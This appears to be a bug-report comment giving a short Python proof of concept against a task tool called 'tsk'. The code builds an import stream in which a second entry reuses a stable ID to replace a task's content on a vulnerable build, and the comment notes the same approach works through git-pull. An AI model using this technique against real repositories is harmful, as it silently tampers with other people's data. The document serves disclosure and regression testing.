PoC for the import case, if you want to drop it into a test:

```python
import hashlib

def git_blob_sha(b):
    return hashlib.sha1(f"blob {len(b)}\0".encode() + b).hexdigest()

root = b"original content\n"
stable = git_blob_sha(root)
malicious = b"replaced content\n"

entry = """From {oid} Mon Sep 17 00:00:00 2001
From: x <x@x>
Date: 1735689600 +0000
Subject: [PATCH tsk] {summary}
X-Tsk-Stable-Id: {stable}
X-Tsk-Parent: {parent}

{summary}

---tsk-tree---
file: content
size: {size}
{body}
---end---

"""
out  = entry.format(oid="a"*40, summary="create", stable=stable,
                    parent="none", size=len(root), body=root.decode())
out += entry.format(oid="b"*40, summary="edit",   stable=stable,
                    parent="a"*40, size=len(malicious),
                    body=malicious.decode())
print(out)
```

Pipe into `tsk import` on a vulnerable build, then `tsk show -T tsk-N`
returns "replaced content". Same shape works against `git-pull` by
appending a malicious commit to the task ref instead of putting it
in an mbox.